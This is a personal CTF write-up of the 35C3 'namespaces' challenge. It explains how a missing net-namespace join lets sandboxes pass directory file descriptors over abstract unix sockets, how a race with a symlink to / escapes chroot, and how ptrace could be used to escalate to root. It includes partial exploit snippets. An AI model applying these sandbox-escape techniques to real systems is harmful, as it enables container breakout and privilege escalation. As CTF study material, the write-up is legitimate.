# Namespaces (sandbox, namespaces, chroot)

This writeup if only for myself. I havn't solved the challenge, I've followed the amazing [writeup](https://blog.perfect.blue/namespaces-35c3ctf) which describes the solution way better then I will. This is one of the nicest challenges I've ever seen and so I strongly encourage you to try it yourself!


## Source code.
The binary given is quite large and so I've placed the reverse engineered source code of it in separete file which can be found [here](source.c).


## Quick description.
The application let's us create up to 10 sandboxes (option 1) in which it will run provided binary.

```console
# nc localhost 1337
A new namespace challenge by popular demand!

What would you like to do?
1) Start sandbox
2) Run ELF
3) Exit
> 1
Please send me an init ELF.
elf len? 
```

We can also select to run binary in already existing sandbox (option 2).

## Creating sandboxes.
Sandboxes are created in very simple way. 

First the main process invokes clone with CLONE_NEWPID, CLONE_NEWNS, CLONE_NEWNET, CLONE_NEWUSER, CLONE_NEWCGROUP, CLONE_NEWUTS flags, so that the child will be placed in seperate namespaces.
Then the child chroots to /tmp/chroots/<$sandbox_idx>.
Finally the child changes its uid/gid to unprivileged user and calls execve on a provided binary.

```c
pid_t new_proc() {
    return syscall(SYS_CLONE, 
        CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET, 
        0, 0, 0);
}

void start_sandbox() {
    [...]

    child_pid = new_proc();
    switch (child_pid) {
        case 0:
            /* Child job. */
            puts("Please send me an init ELF.");
            fd = load_elf();

            memset(path, 0x0, PAGE_SIZE);
            snprintf(path, PAGE_SIZE, "/tmp/chroots/%ld", sandbox_uid);
            mk_chroot_dir(path);

            chroot(path);
            chdir("/");

            setresgid(1, 1, 1);
            setresuid(1, 1, 1);

            /* Just run an init file. */
            execveat(fd, "", "init", NULL, AT_EMPTY_PATH);
            exit(1);
        default:
            [...]
    }
}
```

## Joining sandboxes.
When process join existing sandbox it iterates over /proc/<$sandboxed process pid>/ns/* files, opens them one by one and uses setns to join namespaces.

```c
char *namespaces[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
void change_ns(pid_t sandbox, unsigned int sandbox_idx) {
    char path[PAGE_SIZE];
    int fd;
    printf("[*] enterning namespaces of pid %d\n", sandbox);

    for (int i = 0; i < namespaces / sizeof(char*); i++) {
        sprintf(path, "/proc/%d/ns/%s", sandbox, namespaces[i]);
        fd = open(path, O_RDONLY);
        setns(fd, 0);
    }

    sprintf(path, "/tmp/chroots/%d", sandbox_idx);
    chroot(path);
    chdir("/");

    setresuid(1, 1, 1);
    setresgid(1, 1, 1);
}
```

## Accessing files outside of sandbox.
First we will see how process inside one sandbox can access any files outside of it's root folder being /tmp/chroots/<$sandbox_id>. Why is that possible? Well, because there is a subtle bug in a way a process joins a sandbox. It forgets to join "net" namescape.

So we have two sandboxes. One with root at /tmp/chroots/0 and the other with root at /tmp/chroots/1. And now the question is how a process inside /tmp/chroots/1 can access files which are in /tmp/chroots/0 if both processes share one net_namespace.

If two processes share same net_namespace, they could communicate using socket. Most sockets are associated with a real file lying in file system. These are useless in our situation as the sandboxed processes don't share filesystem. Luckly there are also abstract unix sockets:

```man
# man page
Traditionally, UNIX domain sockets can be either unnamed, or bound to a filesystem
pathname (marked as being of type socket). Linux also supports an abstract namespace
which is independent of the filesystem.
```

How do they work? Well they are just referenced by socket name, that's all.

```c
int listen_for_connection() {
    /* Create named socked in abstract namespace, as sandboxes doesn't share file system. */
    int rcv_sk = socket(AF_UNIX, SOCK_STREAM, 0);
    if (rcv_sk == -1) {
        perror("[!] socket failed");
        return -1;
    }

    /* Bind abstract socket. The rcv_addr.sun_path[0] must be null byte to indicate this is an abstract socket. */
    struct sockaddr_un rcv_addr;
    memset(&rcv_addr, 0x0, sizeof(struct sockaddr_un));
    strncpy(&rcv_addr.sun_path[1], RCV_NAME, strlen(RCV_NAME) + 1);
    rcv_addr.sun_family = AF_UNIX;
    if (bind(rcv_sk, (struct sockaddr*) &rcv_addr, sizeof(sa_family_t) + strlen(RCV_NAME) + 1) == -1) {
        perror("[!] bind failed");
        return -1;
    }
}
```

Ok, so our processes can communicate with each other. But it doesn't mean they can access files outside of their root folders yet.
But there is another useful feature UNIX sockets support. It is transfering file descriptors!

```
UNIX domain sockets support passing file descriptors or process
credentials to other processes using ancillary data.
```

For simplicity I will call process inside /tmp/chroots/0 a receiver and process inside /tmp/chroots/1 a sender.
A sender will retrieve a root directory:

```c
int main() {
     /* Send file descriptor to sender's chroot directory: /tmp/chroots/<sender sandbox idx>. */
    int dir_fd = open("/", O_DIRECTORY | O_RDONLY, 0);
}
```

and will send this file descriptor to receiver. Sending file descriptors must be done using ancillary data messages which are a bit complicated. You can find source code of function responsible for sending file descriptor in sender.c (send_fd) and source code of function responsible for receiving it in receiver.c (receive_fd).

So our receiver got a file descriptor to /tmp/chroots/1, how can it now access a files inside this folder? Well almost every function operating on files which requires passing full path has it equivalent which takes a directory file descriptor and relative path. And so: open has equivalent openat, symlink has equivalent symlinkat, readlink has equivalent readlinkat, etc.
Receiver can open a file /tmp/chroots/1/example.txt by invoking:

```c
int example_fd = openat(received_fd, "example.txt", O_RDONLY, 0);
```

## Escaping the chroot.
Now let's move futher. We want a process to fully escape chroot. This is important as chrooted processes cannot create new namespaces and we will need this ability to gain capabilities later on.

This part was really tricky. Root folders /tmp/chroots/<$id> are created with very loose 0777 permissions. So receiver could for example delete /tmp/chroots/1 being root folder of sender and substitute a symlink to / folder. Then when a next process tries to join sender's sandbox and will invoke chroot("/tmp/chroots/1") it will end up calling chroot("/"). 

Moreover we can make an init process escape the chroot too! The init process is more interesting for us as it is an owner of user namespace. But to make init process escape the chroot in the same way as above we must win a race condition. 

Let's say we have a situation where we have two sandboxes with roots in: 
/tmp/chroots/0 (receiver)
/tmp/chroots/1 (sender)
and receiver has already access to file descriptor refering /tmp/chroots/1. 
Now we create a new sandbox. The main process clones and it's child will now first create a folder /tmp/chroots/<$sandbox_uid> and then chroot to it.

```c
void mk_chroot_dir(char *path) {
    mkdir(path, 0);
    chmod(path, 777);
}

void start_sandbox() {
    [...]

    child_pid = new_proc();
    switch (child_pid) {
        case 0:
            /* Child job. */
            puts("Please send me an init ELF.");
            fd = load_elf();

            memset(path, 0x0, PAGE_SIZE);
            snprintf(path, PAGE_SIZE, "/tmp/chroots/%ld", sandbox_uid);
            mk_chroot_dir(path);

            // <-- Receiver must substitude /tmp/chroots/<$sandbox_uid> with symlink to /

            chroot(path);
            chdir("/");

            setresgid(1, 1, 1);
            setresuid(1, 1, 1);

            /* Just run an init file. */
            execveat(fd, "", "init", NULL, AT_EMPTY_PATH);
            exit(1);
        default:
            [...]
    }
}
```

So if receiver manages to quickly substitude /tmp/chroots/<$sandbox_uid> with symlink to /, the init process will escape the chroot as chroot("/") has no effect:

```c
void substitude_chroot_folder(int fd) {
    /* Wait for the /tmp/chroots/2 folder to be created. */
    while (unlinkat(fd, "../2", AT_REMOVEDIR) == -1) {}
    /* And then remove it. Invoke unlinkat few times to decrease references count. */
    while (!unlinkat(fd, "../2", AT_REMOVEDIR)) {}

    /* Create symlink to / names /tmp/chroots/2, so that chroot(/tmp/chroots/2) has no effect. */
    symlinkat("/", fd, "../2");
}
```

## Escalate?
Now we have an init process which sucessfully escaped chroot. But we must escalate to root. Our init process in an owner of it's pid_namespace and so if it had an CAP_SYS_PTRACE it could trace any process in same pid namespace. How is that usefull? Well, when a new process joins sandbox it first joins the sandboxed process namespaces, then chroots and finally it drops it privileges by invoking setresuid/setresgid. But at the moment when this process joins init process pid namespace, the init process can takeover it with ptrace and thus prevent it from dropping privileges!!!

But there are few problems. First our init process has no CAP_SYS_PTRACE. In order to gain CAP_SYS_PTRACE it has to create a new user namespace.

```
The child process created by clone(2) with the CLONE_NEWUSER flag
starts out with a complete set of capabilities in the new user
namespace. Likewise, a process that creates a new user namespace
using unshare(2) or joins an existing user namespace using setns(2)
gains a full set of capabilities in that namespace.
```